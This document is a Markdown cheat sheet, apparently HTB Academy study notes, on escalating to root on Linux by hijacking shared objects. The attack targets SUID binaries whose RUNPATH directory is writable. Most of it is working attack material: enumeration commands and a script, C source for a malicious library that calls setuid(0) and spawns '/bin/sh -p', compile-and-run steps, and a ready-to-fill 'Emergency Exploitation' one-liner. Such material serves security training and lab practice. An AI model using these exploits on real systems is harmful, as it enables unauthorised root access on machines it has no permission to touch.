# 🎯 Shared Object Hijacking

## 🎯 Overview

Shared object hijacking exploits custom library dependencies in SUID binaries through writable RUNPATH directories, allowing malicious library injection for privilege escalation.

## 🔍 Prerequisites & Detection

### Find SUID Binaries with Custom Libraries
```bash
# Find SUID binaries
find / -type f -perm -4000 2>/dev/null

# Check library dependencies
ldd binary_name

# Look for non-standard libraries
# Example: libshared.so => /development/libshared.so
```

### Check RUNPATH Configuration
```bash
# Check RUNPATH/RPATH settings
readelf -d binary_name | grep PATH

# Example output:
# 0x000000000000001d (RUNPATH) Library runpath: [/development]
```

### Verify Directory Permissions
```bash
# Check if RUNPATH directory is writable
ls -la /development/
# drwxrwxrwx 2 root root 4096 Sep 1 22:06 /development/

# Test write access
touch /development/test && rm /development/test
```

## 🚀 Exploitation Process

### Step 1: Identify Missing Function
```bash
# Copy existing library to trigger error
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so

# Execute binary to see missing function
./payroll
# Output: undefined symbol: dbquery
```

### Step 2: Create Malicious Library
```bash
# Create malicious shared object
cat > exploit.c << EOF
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
EOF
```

### Step 3: Compile and Deploy
```bash
# Compile malicious library
gcc exploit.c -fPIC -shared -o /development/libshared.so

# Verify library placement
ls -la /development/libshared.so
```

### Step 4: Execute and Escalate
```bash
# Execute SUID binary
./payroll

# Should get root shell
# id
# uid=0(root) gid=1000(user) groups=1000(user)
```

## 🔧 Advanced Techniques

### Function Discovery Methods
```bash
# Use strings to find function names
strings binary_name | grep -E "^[a-zA-Z_][a-zA-Z0-9_]*$"

# Use objdump for detailed analysis
objdump -T binary_name

# Use nm for symbol table
nm -D binary_name

# Use strace to see runtime calls
strace ./binary_name 2>&1 | grep -E "open.*\.so"
```

### Multiple Function Implementation
```bash
# If binary needs multiple functions
cat > multi.c << EOF
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    setuid(0);
    system("/bin/bash -p");
}

void calculate_salary() {
    return;  // Dummy implementation
}

void print_report() {
    return;  // Dummy implementation
}
EOF
```

## 🔍 Detection & Enumeration

### Shared Object Hijacking Check
```bash
#!/bin/bash
echo "=== SHARED OBJECT HIJACKING CHECK ==="

echo "[+] SUID binaries with custom libraries:"
find / -type f -perm -4000 2>/dev/null | while read binary; do
    libs=$(ldd "$binary" 2>/dev/null | grep -v "linux-vdso\|ld-linux" | awk '{print $3}')
    for lib in $libs; do
        if [ ! -z "$lib" ] && [ "$lib" != "/lib/x86_64-linux-gnu/"* ] && [ "$lib" != "/usr/lib/"* ]; then
            echo "  Binary: $binary"
            echo "  Custom lib: $lib"
            dir=$(dirname "$lib")
            if [ -w "$dir" ]; then
                echo "  [!] WRITABLE: $dir"
            fi
        fi
    done
done

echo "[+] Checking RUNPATH configurations:"
find / -type f -perm -4000 2>/dev/null | while read binary; do
    runpath=$(readelf -d "$binary" 2>/dev/null | grep "RUNPATH\|RPATH")
    if [ ! -z "$runpath" ]; then
        echo "  Binary: $binary"
        echo "  $runpath"
    fi
done
```

### Quick Analysis Commands
```bash
# Check specific binary
ldd ./suspicious_binary
readelf -d ./suspicious_binary | grep PATH

# Test library loading
LD_LIBRARY_PATH=/tmp ./binary_name

# Check writable library directories
find /opt /usr/local /development -type d -writable 2>/dev/null
```

## 🔑 Quick Reference

### Immediate Checks
```bash
# Find SUID with custom libs
find / -type f -perm -4000 -exec ldd {} \; 2>/dev/null | grep -E "/opt/|/development/|/usr/local/"

# Check RUNPATH
find / -perm -4000 -exec readelf -d {} \; 2>/dev/null | grep "RUNPATH\|RPATH"

# Writable lib directories
ls -la /development/ /opt/lib/ /usr/local/lib/ 2>/dev/null
```

### Emergency Exploitation
```bash
# If vulnerable SUID found with writable RUNPATH
echo 'void FUNCTION_NAME(){setuid(0);system("/bin/sh -p");}' > exploit.c
gcc exploit.c -fPIC -shared -o /writable/path/library.so
./vulnerable_suid_binary
```

### HTB Academy Workflow
```bash
# 1. Find SUID binary
find / -type f -perm -4000 2>/dev/null

# 2. Check dependencies and RUNPATH
ldd ./payroll
readelf -d ./payroll | grep PATH

# 3. Identify missing function
./payroll  # Note error: undefined symbol: dbquery

# 4. Create and compile exploit
gcc exploit.c -fPIC -shared -o /development/libshared.so

# 5. Execute for root shell
./payroll
```

---

*Shared object hijacking exploits custom library loading mechanisms - writable RUNPATH directories combined with SUID binaries create privilege escalation opportunities through malicious library injection.* 